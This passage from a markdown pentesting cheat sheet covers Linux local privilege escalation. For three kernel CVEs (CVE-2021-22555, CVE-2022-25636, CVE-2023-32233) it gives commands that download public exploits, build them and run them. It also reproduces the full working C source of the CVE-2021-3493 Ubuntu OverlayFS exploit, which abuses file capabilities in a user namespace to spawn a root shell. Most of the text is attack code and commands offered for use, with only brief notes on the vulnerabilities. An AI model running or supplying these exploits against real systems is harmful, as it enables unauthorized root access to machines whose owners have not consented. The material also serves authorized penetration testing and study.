Linux kernel `5.8` - `5.17`

```sh
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```
```sh
gcc -m32 -static exploit.c -o exploit
```
```sh
./exploit
```

[CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) —
Linux kernel `5.4` - `5.6.10`

<!-- Info {{{-->
> [!info]-
>
> `net/netfilter/nf_dup_netdev.c`, which can grant root privileges
> to local users due to heap out-of-bounds write
>
> - [The Discovery and Exploitation of CVE-2022-25636](https://nickgregory.me/post/2022/03/12/cve-2022-25636/)
>
<!-- }}} -->

```sh
git clone https://github.com/Bonfee/CVE-2022-25636.git
```
```sh
cd CVE-2022-25636
```
```sh
make
```
```sh
./exploit
```

[CVE-2023-32233](https://nvd.nist.gov/vuln/detail/cve-2023-32233) —
Linux kernel to `6.3.1`

<!-- Info {{{-->
> [!info]-
>
> This vulnerability exploits the `anonymous sets` in `nf_tables`
> by using the [Use-After-Free](https://en.wikipedia.org/wiki/Dangling_pointer)
> vulnerability in the Linux Kernel
>
> These `nf_tables` are temporary workspaces
> for processing batch requests and once the processing is done,
> these anonymous sets are supposed to be cleared out
> (*Use-After-Free*)
>
> Due to a mistake in the code,
> these anonymous sets are not being handled properly
> and can still be accessed and modified by the program
>
> The exploitation is done by manipulating the system
> to use the cleared out anonymous sets
> to interact with the kernel's memory
>
<!-- }}} -->

```sh
git clone https://github.com/Liuk3r/CVE-2023-32233
```
```sh
cd CVE-2023-32233
```
```sh
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```
```sh
./exploit
```

<!-- }}} -->

<!-- Ubuntu OverlayFS {{{-->
### Ubuntu OverlayFS

[CVE-2021-3493](https://nvd.nist.gov/vuln/detail/CVE-2021-3493) —
Ubuntu OverlayFS Local Privesc

<!-- Info {{{-->
> [!info]-
>
> Affected versions
>
> - Ubuntu `20.10`
> - Ubuntu `20.04 LTS`
> - Ubuntu `19.04`
> - Ubuntu `18.04 LTS`
> - Ubuntu `16.04 LTS`
> - Ubuntu `14.04 ESM`
>
<!-- }}} -->

<!-- Exploit {{{-->
> [!Tip]- Exploit
>
> [GitHub - briskets/CVE-2021-3493](https://github.com/briskets/CVE-2021-3493)
>
> ```sh
> touch exploit.c
> ```
> ```sh
> vim exploit.c
> ```
> ```sh
> gcc exploit.c -o exploit && chmod +x exploit
> ```
> ```sh
> ./exploit
> ```
>
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <err.h>
> #include <errno.h>
> #include <sched.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <sys/wait.h>
> #include <sys/mount.h>
>
> //#include <attr/xattr.h>
> //#include <sys/xattr.h>
> int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
>
>
> #define DIR_BASE    "./ovlcap"
> #define DIR_WORK    DIR_BASE "/work"
> #define DIR_LOWER   DIR_BASE "/lower"
> #define DIR_UPPER   DIR_BASE "/upper"
> #define DIR_MERGE   DIR_BASE "/merge"
> #define BIN_MERGE   DIR_MERGE "/magic"
> #define BIN_UPPER   DIR_UPPER "/magic"
>
>
> static void xmkdir(const char *path, mode_t mode)
> {
>     if (mkdir(path, mode) == -1 && errno != EEXIST)
>         err(1, "mkdir %s", path);
> }
>
> static void xwritefile(const char *path, const char *data)
> {
>     int fd = open(path, O_WRONLY);
>     if (fd == -1)
>         err(1, "open %s", path);
>     ssize_t len = (ssize_t) strlen(data);
>     if (write(fd, data, len) != len)
>         err(1, "write %s", path);
>     close(fd);
> }
>
> static void xcopyfile(const char *src, const char *dst, mode_t mode)
> {
>     int fi, fo;
>
>     if ((fi = open(src, O_RDONLY)) == -1)
>         err(1, "open %s", src);
>     if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
>         err(1, "open %s", dst);
>
>     char buf[4096];
>     ssize_t rd, wr;
>
>     for (;;) {
>         rd = read(fi, buf, sizeof(buf));
>         if (rd == 0) {
>             break;
>         } else if (rd == -1) {
>             if (errno == EINTR)
>                 continue;
>             err(1, "read %s", src);
>         }
>
>         char *p = buf;
>         while (rd > 0) {
>             wr = write(fo, p, rd);
>             if (wr == -1) {
>                 if (errno == EINTR)
>                     continue;
>                 err(1, "write %s", dst);
>             }
>             p += wr;
>             rd -= wr;
>         }
>     }
>
>     close(fi);
>     close(fo);
> }
>
> static int exploit()
> {
>     char buf[4096];
>
>     sprintf(buf, "rm -rf '%s/'", DIR_BASE);
>     system(buf);
>
>     xmkdir(DIR_BASE, 0777);
>     xmkdir(DIR_WORK,  0777);
>     xmkdir(DIR_LOWER, 0777);
>     xmkdir(DIR_UPPER, 0777);
>     xmkdir(DIR_MERGE, 0777);
>
>     uid_t uid = getuid();
>     gid_t gid = getgid();
>
>     if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
>         err(1, "unshare");
>
>     xwritefile("/proc/self/setgroups", "deny");
>
>     sprintf(buf, "0 %d 1", uid);
>     xwritefile("/proc/self/uid_map", buf);
>
>     sprintf(buf, "0 %d 1", gid);
>     xwritefile("/proc/self/gid_map", buf);
>
>     sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
>     if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
>         err(1, "mount %s", DIR_MERGE);
>
>     // all+ep
>     char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
>
>     xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
>     if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
>         err(1, "setxattr %s", BIN_MERGE);
>
>     return 0;
> }
>
> int main(int argc, char *argv[])
> {
>     if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
>         setuid(0);
>         setgid(0);
>         execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
>         err(1, "execl /bin/bash");
>     }
>
>     pid_t child = fork();
>     if (child == -1)
>         err(1, "fork");
>
>     if (child == 0) {
>         _exit(exploit());
>     } else {
>         waitpid(child, NULL, 0);
>     }
>
>     execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
>     err(1, "execl %s", BIN_UPPER);
> }
> ```
<!-- }}} -->

```sh
gcc exploit.c -o exploit && chmod +x exploit
```

```sh
./exploit
```

<!-- }}} -->

___
<!-- }}} -->
